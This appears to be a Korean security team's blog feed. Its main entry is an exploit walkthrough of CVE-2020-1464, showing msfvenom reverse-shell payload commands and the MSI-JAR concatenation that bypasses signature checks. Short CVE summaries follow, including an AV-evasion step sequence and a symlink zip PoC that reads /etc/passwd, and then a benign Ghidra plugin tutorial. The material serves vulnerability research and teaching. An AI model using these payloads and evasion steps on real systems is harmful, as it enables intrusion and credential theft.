    <content type="html"><![CDATA[<p>안녕하세요! 글 쓰는 걸 미루고 미루다 idioth 팀장님의 구박에 겨우겨우 첫 글을 쓰는 L0ch입니다. </p><p><del>악덕 상사 우우 길 가다 레고 블록이나 밟아라</del> </p><p>오늘은 Windows의 취약점 하나를 들고 왔는데요, 함께 보실까요? </p><h1 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h1><p>GlueBall이라고 불리는 CVE-2020-1464는 2018년 9월에 제보되었습니다. 근데 마소 친구들이 패치 안 하고 있다가 2년이 지난 최근 patch tuesday라고 불리는 정기 패치에서 패치가 되었…? 왜 지금 와서???</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img1.png"></p><p>이상하긴 하지만… 넘어가도록 하고 취약점을 이해하는데 필요한 배경 지식부터 알아보도록 합시다!</p><h1 id="MSI-Microsoft-Installer"><a href="#MSI-Microsoft-Installer" class="headerlink" title="MSI (Microsoft Installer)"></a>MSI (Microsoft Installer)</h1><p>Windows 설치 패키지<br>→ Windows용 애플리케이션의 설치 및 업데이트를 배포하는 데 사용됩니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img2.png"></p><p>오늘의 희생양(ㅎㅎ)이 될 우리 크롬 어서 오고.<br>크롬도 MSI로 배포되는 것을 알 수 있습니다. malicious 하게 꾸며줄 테니 조금만 기다리라구~</p><h1 id="Code-Signing-Certificate-코드-서명-인증서"><a href="#Code-Signing-Certificate-코드-서명-인증서" class="headerlink" title="Code Signing Certificate(코드 서명 인증서)"></a>Code Signing Certificate(코드 서명 인증서)</h1><blockquote><p><strong>Code Signing Certificate</strong><br>MS가 도입한 실행파일과 스크립트의 디지털 서명 과정으로, 이러한 인증서는 파일이 안전한 파일임을 증명해준다. SmartScreen filter는 인증서에 대한 자체적인 white list DB를 관리해 해당 인증서가 안전한지 아닌지<br>판단한다. 인증서가 존재하지 않거나 파일이 변조되어 인증서가 유효하지 않으면 실행할 때 경고를 띄워<br>사용자에게 알린다.</p></blockquote><p><img src="/2020/11/01/l0ch/cve-2020-1464/img3.png"></p><p>코드 서명 인증서가 도입되면서, 인증서가 확인되지 않은 파일의 무분별한 실행이 줄었습니다. 그러나 여기서 끝나면 섭섭하죠? 유효하지 않은 인증서임에도 인증서 검증을 우회할 수 있는 취약점이 발견되었는데 이것이 오늘 설명할 GlueBall입니다.</p><h1 id="GlueBall-CVE-2020-1464"><a href="#GlueBall-CVE-2020-1464" class="headerlink" title="GlueBall : CVE-2020-1464"></a>GlueBall : CVE-2020-1464</h1><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>취약점은 MSI 파일의 인증서 검증 과정에서 발생합니다. </p><p>MSI 파일을 실행하면 <code>msisip.dll</code>의 <code>MsiSIPVerifyIndirectData()</code> 함수에서 파일의 시작 부분이 유효한 MSI 파일인지 검증하고 서명을 확인합니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img4.png"></p><p>그런데 이때 파일의 사이즈를 검증하지 않아 MSI 파일의 뒤에 임의의 데이터가 추가되어도 유효한 인증서라고 판단하게 되고, 공격자는 이를 이용해 인증서 검증을 우회하고 malicious 파일을 실행하도록 할 수 있습니다.</p><h2 id="JAR-Java-Archive"><a href="#JAR-Java-Archive" class="headerlink" title="JAR(Java Archive)"></a>JAR(Java Archive)</h2><p><img src="/2020/11/01/l0ch/cve-2020-1464/img5.webp"></p><p>JAR은 자바 플랫폼 배포를 위한 패키지 파일 포맷입니다.<br>특징으로는 zip 포맷으로 빌드되어 자바 런타임에서 로드될 때 파일의 끝에서부터 로드됩니다.</p><p>→ 파일 앞에 임의의 데이터가 있어도 정상 실행이 가능합니다.</p><p>슬슬 감이 올락 말락 하죠??</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>앞서 나온 취약점과 JAR 파일의 특성을 조합하면..?</p><p><strong>MSI 파일 끝에 임의 데이터가 와도 유효한 인증서가 되는 취약점 + 파일 앞에 임의의 데이터가 있어도 정상 실행되는 jar</strong></p><p>축하합니다! 익스플로잇 시나리오가 완성되었습니다!</p><p>그림으로 정리하면 다음과 같습니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img6.png" alt="출처:https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/"></p><p>만능 메타스플로잇으로 리버스 쉘 malicious 파일을 생성해서 익스를 해볼게요.</p><p>msfvenom으로 리버스 쉘을 여는 jar포맷의  malicious 파일을 생성합니다.</p><pre><code class="hljs markdown">msfvenom -p java/meterpreter/revserse<span class="hljs-emphasis">_https LHOST=[HOST IP] -f jar -o [filename].jar</span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img7.png"></p><p>리스너도 미리 열어두겠습니다.</p><pre><code class="hljs markdown">handler -p java/meterpreter/reverse<span class="hljs-emphasis">_https -H 0.0.0.0 </span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img8.png"></p><p>생성된 jar 파일과 크롬 설치 msi 파일을 합칩니다. 이때 꼭 msi파일 뒤에 jar 파일이 오도록 순서를 지켜야 한다는 점!</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img9.png"></p><p>이제 생성된 exploit.jar 에서 인증서가 유효한지 확인해보면</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img10.png"></p><p>요렇게 유효한 인증서로 나오는 것을 볼 수 있습니다. </p><p>실행을 해보면 피해 PC에서는 아무 반응도 없지만, 프로세스에서는 자바가 돌아가고 있고</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img11.png"></p><p>위 사진과 같이 리버스 쉘이 정상적으로 동작하는 걸 볼 수 있습니다!</p><h2 id="Patch-diffing"><a href="#Patch-diffing" class="headerlink" title="Patch diffing"></a>Patch diffing</h2><p>MS는 이에 대한 패치를 내놨는데요, 어떻게 패치를 했는지 패치 이후의 msisip.dll를 구해 비교해보겠습니다.</p><blockquote><p>💡주의! 글쓴이의 삽질이 담겨 있습니다.</p></blockquote><p>않이 근데.. 이거 익스하고 글 좀 쓰고 디핑 하려고 보니까 그새 윈도우가 업데이트를 해버렸네..?</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img12.jpg"></p><p>아 ** </p><ul><li>자동 업데이트 안 끔</li><li>스냅샷 안 만들어놓음</li></ul><p>→ 패치 전의 msisip.dll 못 구함 → ?????????</p><p>윈도우 원데이 분석할 땐 자동 업데이트는 꼭 끄도록 해요……. 아니면 스냅샷이라도…</p><p>패치 전의 msisip.dll을 어떻게 구하지? 어떻게 구하긴 조진 거지 ㅋㅋ</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img13.png"></p><p>엿같은 자동 업데이트 덕분에 던질 뻔했지만..^^<br>결국 idioth형 vm에 패치 전 파일이 있어서 그거 구걸해서 디핑 해버렸지요. 팀장님 최고 ~<br>넘겨주는 대신 리제로 정주행 하라는 협박은 못 들은 걸로 하겠습니다; </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img14.png"></p><p>회색 노드는 새로 추가된 코드, 노란색 노드는 변경된 노드입니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img15.png"></p><p>회색 노드를 보면 <code>MsiSIPVerifyIndirectData()</code> 함수에서 <code>NeedFileSizeVerification()</code> 과 <code>VerifyFileSize()</code> 를 호출하는 코드가 추가된 것을 보아 MSI 파일의 사이즈를 확인하는 코드를 추가해 취약점 패치를 한 것을 알 수 있습니다.</p><p>취약점 분석이랑 익스 하는 것보다 디핑 하는데 시간을 훨씬 많이 썼네요…^^ 이  과정을 개선할 여지가 있을 것 같아 다음 글은 디핑과 관련된 연구 주제 일 것 같습니다.  이거 하느라 윈도우 vm만 5개 만든 건 안 비밀 ^.^ </p><p>그럼 다음 글로 돌아올게요 안녕!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>msi</tag>
      
      <tag>code signing certificate</tag>
      
      <tag>jar</tag>
      
      <tag>glueball</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15238: Blueman argument injection</title>
    <link href="/2020/10/31/fabu1ous/2020-10-31/"/>
    <url>/2020/10/31/fabu1ous/2020-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.exploit-db.com/exploits/48963">Blueman &lt; 2.1.4 - Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Blueman 2.1.4 이전 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-bus(Desktop-bus)는 IPC 혹은 RPC 메커니즘입니다. D-bus의 DHCPClient 메소드와 Blueman 사이에 arguments sanitizing 과정이 없어 argument injection이 발생하고, 시스템 구성에 따라 impact가 2가지로 나뉩니다. </p><pre><code class="hljs routeros">1. isc-dhcp-client 사용 시<span class="hljs-built_in">ip </span>명령어에 argument injection, 인터페이스를 종료하는 Dos2. dhcpd package 사용 시<span class="hljs-string">&quot;-c/arbitrary_script_path&quot;</span>옵션을 사용해 임의의 스크립트를 실행</code></pre><p>대부분의  D-bus 인터페이스는 PolicyKit으로 Authentication을 거치지만 Blueman 2.0.6 이전 버전은 Polkit-1이 기본적으로 비활성화되어있어, 모든 로컬 유저가 취약점을 트리거할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html">https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>linux</tag>
      
      <tag>blueman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6449: Exploiting a textbook use-after-free in Chrome</title>
    <link href="/2020/10/30/l0ch/10-30_1day1line/"/>
    <url>/2020/10/30/l0ch/10-30_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf">Exploiting a textbook use-after-free in Chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome version: master branch build 79956ba, asan build 80.3987.132 Operating System: Ubuntu 18.04</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-6449는 Chrome에서 사용하는 blink 엔진의 <code>WebAudio</code> 모듈에서 발생하는 Use-After-Free 취약점 입니다. </p><p>취약점은 <code>DeferredTaskHandler::BreakConnections</code> 에서 발생합니다. 일반적으로 <code>active_source_handlers_</code>는 <code>finished_source_handlers_</code> 의 원시 포인터를 활성 상태로 유지하는 역할을 하며 사용이 완료된 이후에는 할당된 <code>active_source_handlers_</code> 와 <code>finished_source_handlers_</code> 가 같이 free되어야 합니다.</p><p>그러나 컨텍스트를 삭제하여 <code>BaseAudioContext::Uninitialize</code> 가 실행된 이후 <code>DeferredTaskHandler::ClearHandlersToBeDeleted</code> 를 호출하면 <code>active_source_handlers_</code> 만 free되고 <code>finished_source_handlers_</code> 에 free된 포인터가 남게 됩니다. 이후 <code>DeferredTaskHandler::BreakConnections</code> 를 호출해 UAF 취약점을 트리거할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc">https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-040-chrome">https://securitylab.github.com/advisories/GHSL-2020-040-chrome</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>use after free</tag>
      
      <tag>L0ch</tag>
      
      <tag>chrome</tag>
      
      <tag>chromium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16939: Windows Group Policy DACL overwrite를 이용한 권한 상승</title>
    <link href="/2020/10/29/idioth/2020-10-29/"/>
    <url>/2020/10/29/idioth/2020-10-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation">CVE-2020-16939: WINDOWS GROUP POLICY DACL OVERWRITE PRIVILEGE ESCALATION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 그룹 정책 업데이트 실행 중에 수행되는  <code>SetSecurityFile</code>을 악용하는 취약점입니다.</p><p><code>gpupdate /target:user /force</code> 실행 시 <code>SetSecurityFile</code>는 impersonation 없이 수행됩니다. 그룹 정책 업데이트가 실행된 후 <code>%programdata%\Microsoft\GroupPolicy\Users\&lt;SID&gt;</code>의 소유자는 Administrators가 되고 User 그룹은 읽기 및 실행 권한만 갖게 됩니다. 하지만 하위 디렉터리인 <code>\Datastore\0\sysvol</code>의 소유자는 User가 됩니다. 따라서 권한이 낮더라도 해당 폴더의 권한을 수정할 수 있습니다.</p><p><code>sysvol</code> 디렉터리 아래에 권한을 수정할 디렉터리의 Junction을 생성한 후 그룹 정책 업데이트를 실행합니다. 해당 폴더와 폴더 내의 파일들은 모두 DACL Write의 대상이 되며  DACL Write 중 에러가 발생하면 수정한 권한이 부여됩니다. 에러가 발생하게 하는 방법 중 하나는 DACL Write가 완료되기 전에 <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">oplock</a>을 사용하여 juction을 삭제하는 것입니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>dacl</tag>
      
      <tag>group policy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Process Herpaderping</title>
    <link href="/2020/10/28/fabu1ous/2020-10-28/"/>
    <url>/2020/10/28/fabu1ous/2020-10-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jxy-s.github.io/herpaderping/">Process Herpaderping</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>OS</strong></p><ul><li>Windows 7 Enterprise x86</li><li>windows 10 Pro x64</li><li>Windows 10 Pro Insider Preview x64</li></ul><p><strong>Security Prodct</strong></p><ul><li>Windows Defender AntiMalware Client</li><li>Windows Defender Engine</li><li>Windows Defender Antivirus</li><li>Windows Defender Antispyware</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><code>Herpaderping</code>이라는 Detection Evasion 기술입니다. 디스크에 존재하는 실행파일을 Process object의 생성과 Initial Thread 삽입 과정 사이에서 수정하는 탐지 우회 방법이 존재합니다. 이를 방지하고자 파일에 write 작업이 있었는지 확인하는 <code>on-write scanning</code>이 도입됐습니다. 문제는 이 <code>on-write scanning</code>이 <code>IRP_MJ_CLEANUP</code>(== file handle close)이 발생하기 전까지 파일의 수정 여부를 검사하지 않는다는 겁니다. 따라서 아래와 같은 순서로 우회가 가능합니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> CreateFile (File handle을 계속 열어놓는다.)<span class="hljs-number">2.</span> NtCreateSectioin<span class="hljs-number">3.</span> NtCreatePrcessex<span class="hljs-number">4.</span> 실행파일 수정<span class="hljs-number">5.</span> NtCreateThreadEx<span class="hljs-number">6.</span> CloseFile (IRP_MJ_ClEANUP)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>detection evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message</title>
    <link href="/2020/10/27/l0ch/10-27_1day1line/"/>
    <url>/2020/10/27/l0ch/10-27_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/">Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message (CVE-2020-8255)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Pulse Connect Secure</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSL VPN 서비스인 Pulse Connect Secure에서 로그온 메시지 구성 요소를 악용해 arbitrary file read가 가능한 취약점이 발견되었습니다.</p><p>관리자는 로그인 시 출력되는 메시지를 <code>/dana-admin/auth/signinNotf.cgi</code> 페이지를 통해 설정할 수 있는데, <code>en.txt</code> 및 <code>default.txt</code> 파일로 구성된 zip 형식의 파일을 업로드하면 해당 파일의 내용이 로그온 메시지로 표시됩니다.</p><p>이때 zip 파일에 포함된 파일의 심볼릭 링크 여부를 확인하지 않으며 read 할 파일을 심볼릭 링크로 설정하는 arbitrary file read가 가능합니다.</p><p>다음은 <code>/etc/passwd</code> 파일을 출력하는 POC입니다.</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-keyword">default</span>.txtln -s <span class="hljs-regexp">/etc/</span>passwd en.txtzip --symlinks logon.zip <span class="hljs-keyword">default</span>.txt en.txtadding: <span class="hljs-keyword">default</span>.txt (stored <span class="hljs-number">0</span>%)adding: en.txt (stored <span class="hljs-number">0</span>%)</code></pre><p>위와 같이 파일에 심볼릭 링크를 설정해 zip으로 압축한 뒤 <code>/dana-admin/auth/signinNotf.cgi</code> 페이지에 업로드하면 로그온 페이지에 <code>/etc/passwd</code>의 내용이 표시됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1034: Windows Kernel EoP</title>
    <link href="/2020/10/26/idioth/cve-2020-1034/"/>
    <url>/2020/10/26/idioth/cve-2020-1034/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=2">Explicit Is Always Good? Read the Story of CVE-2020-1034</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 8</li><li>Windows 10</li><li>Windows Server 2012</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>지난 9월 커널 권한 상승 취약점에 대한 패치가 포함되었습니다. 해당 패치에 영향을 받는 모듈은 <code>ntoskrnl.exe</code>입니다.</p><p><code>EtwpNotifyGuid</code>에서 <code>cmp [rdi+0Ch], r12b</code>를 수행하는데 <code>r12b</code>의 초기화 값은 4이지만 1로 리셋이 됩니다. <code>byte ptr[rdi+0Ch]</code>가 1의 값과 같다면 <code>rdi+18h</code> 값은 새로 생성된 <code>UmReplyObject</code>의 주소로 설정됩니다. <code>twpQueueNotification</code>에서 <code>UmReplyObject</code>가 참조된 부분을 찾으면 <code>bl</code>의 값은 0이고 <code>rbp+0Ch</code>가 0이 아닐 시 <code>rbp+18h</code>는 객체의 포인터를 읽습니다. </p><p><code>rbp+0Ch</code>는  <code>EtwpNotifyGuid</code>에서는 1과 비교하여 <code>UmReplyObject</code>를 만들지 여부를 결정하지만 마지막 비교에서 0과 비교하여 일관성 없는 비교가 됩니다.</p><p>만약 비교한 값이 1이나 0이 아닐 경우 객체 주소가 임의의 값으로 사용되고 <code>ObfReferenceObject</code>가 호출되어 <code>ptr[[InputBuffer + 0x18]-0x30] ++</code>연산이 수행되어 임의 주소 증가가 이루어집니다. 따라서 Windows 10 RS4 이상의 커널에서 프로세스 토큰의 권한 필드를 조작할 수 있습니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>idioth</tag>
      
      <tag>ntoskrnl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] AngryGhidra를 사용해보자!</title>
    <link href="/2020/10/25/idioth/angryghidra/"/>
    <url>/2020/10/25/idioth/angryghidra/</url>
    
    <content type="html"><![CDATA[<p>하지메마시떼! 반갑습니다 오늘도 띨띨한 idioth입니다.</p><p>오늘 소개해드릴 툴은 AngryGhidra라는 툴입니다.</p><p>누군가(?)가 올려준 링크를 보고 오 이거 편하겠는데 한 번 써볼까? 하고 써봤다가 사용해볼 만한 가치가 있는 것 같아서 글을 작성해봅니다.</p><p><a href="https://github.com/angr/angr">angr</a>에 대해 설명해드리자면 바이너리 분석을 도와주는 python 라이브러리입니다.</p><p>기존 angr를 사용하려면 IDA와 같은 툴을 사용하여 분석하고 주소를 구하고 python 코드에다가 적고… 다시 구하고 코드에다가 적고 하는 노가다를 진행해야 했습니다. 하지만 이 녀석을 사용하면 Ghidra에서 분석하고 클릭질만 몇 번 하면 angr의 기능을 사용할 수 있습니다.</p><p>저녁 먹고 와서 공부도 하기 싫겠다… 요거나 세팅해서 써보면서 갖고 놀아봐야겠다… 히히히 하는 생각은 30분 만에 깨져버리게 됩니다.</p><h1 id="예상치-못한-삽질"><a href="#예상치-못한-삽질" class="headerlink" title="예상치 못한 삽질"></a>예상치 못한 삽질</h1><p>분명 Readme.md에서는 릴리즈 버전을 설치하여 Extension 추가하면 된다 했다.</p><p>→ 근데 왜 릴리즈 버전이 아무것도 없는 거지? 함정인가</p><p>그냥 git clone하면 빌드 된 파일이 있을 거라 생각하였으나 없었다.</p><p>→ clone하고 있는 파일들 전부다 Ghidra Extension에서 클릭해봤으나 오류만 엄청 뜸.. build.gradle 파일이 있으니 gradle로 빌드를 해보자</p><p>gradle을 통해 빌드를 하는데 정상적으로 되질 않네..?</p><p>→ 내가 뭘 하려 할 때마다 오류가 뜬다… 이쯤에서 멘탈이 나가서 혼자 모니터 앞에서 욕을 하기 시작</p><p>우여곡절 속에서 빌드 성공(!) 후 신나서 L0ch에게 야 빌드 했다 이제 돌려본다 옆에서 딱 기다려 ㅋㅋ하고 옆에 세워뒀습니다. 하지만 가져온 바이너리를 돌렸는데 angr가 돌아가지 않았다…</p><blockquote><p>L0ch 日 : 아니 형 된다면서 안되잖아 뭐야 빨리 다시 삽질해요</p></blockquote><p><del>나쁜넘</del> 아무튼 여기서 멈출 수 없으므로 angr를 재설치해보고 python 버전이 문젠가 삽질을 다시 시작합니다…</p><p>결국 멘탈이 박살 난 상태로 집에 가서 애니메이션(?)을 보며 힐링 후 다음 날 다시 도전을 해보았습니다.</p><p>UE(User Error)일 가능성이 크다고 생각하며 오늘의 나와 어제의 나는 다르기 때문에 또 돌렸는데 실행이 안 됐습니다.. 도대체 왜 안돼?라고 생각하는 찰나 내 머리에 스친 생각</p><blockquote><p>아니 이거 elf 파일인데 왜 windows에서 돌리고 있지??</p></blockquote><p align="center"><img src="./img1.jpg" width=60% height=60%></p><p>ubuntu로 옮긴 다음에 다시 위의 과정 반복 후 다시 L0ch를 불렀습니다. 이 자식은 형이 부르는데 맨날 투덜거려요. “안되기만 해 봐” 하면서 와놓고 되니까 따봉 날리고 갑니다.</p><p>현재는 Pre-release로 AngryGhidra v0.1이 업로드된 상태라서 귀찮으신 분은 <a href="https://github.com/Nalen98/AngryGhidra/releases">릴리즈 버전을 다운로드</a> 받아 Extension을 바로 추가하면 될 것 같습니다.</p><h1 id="근데-Ghidra가-뭔데"><a href="#근데-Ghidra가-뭔데" class="headerlink" title="근데 Ghidra가 뭔데?"></a>근데 Ghidra가 뭔데?</h1><p><a href="https://ghidra-sre.org/">Ghidra</a>는 NSA에서 개발한 역어셈블러 프레임워크입니다. 뭐 하는 녀석인지 잘 모르겠으면 IDA 같은 녀석이라고 보시면 됩니다.</p><p>오픈 소스로 공개되었으며 jdk 11 버전에서 정상적으로 작동됩니다.</p><p>다른 응용 프로그램들처럼 설치 파일을 통해 설치하는 것이 아닌 압축 파일을 다운 받아서 압축만 해제하면 바로 실행할 수 있습니다.</p><p>지원 플랫폼</p><ul><li>Windows 7 or 10 (64bit)</li><li>Linux (64bit, CentOs 7 is preferred)</li><li>macOS(OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32비트 OS에서는 Ghidra를 사용할 수 없습니다.</p><h2 id="우분투에-Ghidra-설치하기"><a href="#우분투에-Ghidra-설치하기" class="headerlink" title="우분투에 Ghidra 설치하기"></a>우분투에 Ghidra 설치하기</h2><h3 id="자바-환경-설치"><a href="#자바-환경-설치" class="headerlink" title="자바 환경 설치"></a>자바 환경 설치</h3><pre><code class="hljs bash">$ sudo add-apt-repository ppa:openjdk-r/ppa$ sudo apt install openjdk-11-jre openjdk-11-jre-headless openjdk-11-jdk openjdk-11-jdk-headless</code></pre><h3 id="Ghidra-설치"><a href="#Ghidra-설치" class="headerlink" title="Ghidra 설치"></a>Ghidra 설치</h3><p><a href="https://ghidra-sre.org/">기드라 사이트</a>에서 최신 버전의 기드라를 설치해줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img2.png"></p><p>설치 후 원하는 폴더에서 압축을 해제하면 ghidra가 정상적으로 설치됩니다.</p><pre><code class="hljs bash">idioth@ubuntu:~$ ls -al ghidra_9.1.2_PUBLICtotal 56drwxr-xr-x  9 idioth idioth  4096  9월 11 15:15 .drwxr-xr-x 31 idioth idioth  4096  9월 14 17:01 ..drwxr-xr-x  5 idioth idioth  4096  2월 12  2020 docsdrwxr-xr-x  5 idioth idioth  4096  2월 12  2020 Extensionsdrwxr-xr-x  8 idioth idioth  4096  2월 12  2020 Ghidra-rwxr-xr-x  1 idioth idioth   883  2월 12  2020 ghidraRun-rw-r--r--  1 idioth idioth   384  2월 12  2020 ghidraRun.batdrwxr-xr-x  7 idioth idioth  4096  2월 12  2020 GPL-rw-r--r--  1 idioth idioth 11357  2월 12  2020 LICENSEdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 licensesdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 serverdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 support</code></pre><p>Windows의 경우 ghidraRun.bat를 통해 실행하고 우분투의 경우 ghidraRun을 통해 실행해 줍니다. 실행 권한이 없을 경우 chmod +x ghidraRun을 통해 실행 권한을 주면 됩니다.</p><h1 id="AngryGhidra"><a href="#AngryGhidra" class="headerlink" title="AngryGhidra"></a>AngryGhidra</h1><p>기드라가 정상적으로 설치되었다면 <a href="https://github.com/Nalen98/AngryGhidra/releases">AngryGhidra</a>를 설치해 줍니다.</p><h2 id="Angr-설치"><a href="#Angr-설치" class="headerlink" title="Angr 설치"></a>Angr 설치</h2><pre><code class="hljs bash">$ sudo pip3 install angr</code></pre><h2 id="Releases로-플러그인-등록"><a href="#Releases로-플러그인-등록" class="headerlink" title="Releases로 플러그인 등록"></a>Releases로 플러그인 등록</h2><p>pre-releases가 올라왔으니 저와 같은 시간 낭비(?)는 하지 말고 릴리즈 버전으로 등록을 해봅시다.</p><pre><code class="hljs bash">$ wget https://github.com/Nalen98/AngryGhidra/releases/download/0.1%2Bghidra-9.1.2/ghidra_9.1.2_PUBLIC_20200909_AngryGhidra.zip</code></pre><p>릴리즈 버전을 설치해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img3.png"></p><p>기드라 실행 후 File-Install Extensions을 선택해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img4.png"></p><p>우측 상단에 +버튼을 선택해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img5.png"></p><p>설치 받은 zip 파일을 선택해 준 후 체크해 줍니다.</p><p>그러면 끝납니다. 체크하고 OK 누르면 설치 완료~</p><h2 id="Gradle을-통해서-직접-빌드하는-방법"><a href="#Gradle을-통해서-직접-빌드하는-방법" class="headerlink" title="Gradle을 통해서 직접 빌드하는 방법"></a>Gradle을 통해서 직접 빌드하는 방법</h2><p>릴리즈 버전이 올라와 있기 때문에 굳이 이 방법을 택하시는 분이 없을 거라 생각하지만 혹시 본인이 직접 빌드 해보고 싶으시다면 직접 빌드 해보시는 것도 추천드립니다.</p><pre><code class="hljs bash">$ sudo apt install gradle$ git <span class="hljs-built_in">clone</span> https://github.com/Nalen98/AngryGhidra</code></pre><p>gradle을 통해서 빌드 하기 위해 gradle을 설치하고 AngryGhidra repository를 가져옵니다.</p><pre><code class="hljs bash">~/AngryGhidra$ gradle buildExtensionStarting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status <span class="hljs-keyword">for</span> detailsFAILURE: Build failed with an exception.* Where:Build file <span class="hljs-string">&#x27;/home/idioth/AngryGhidra/build.gradle&#x27;</span> line: 31* What went wrong:A problem occurred evaluating root project 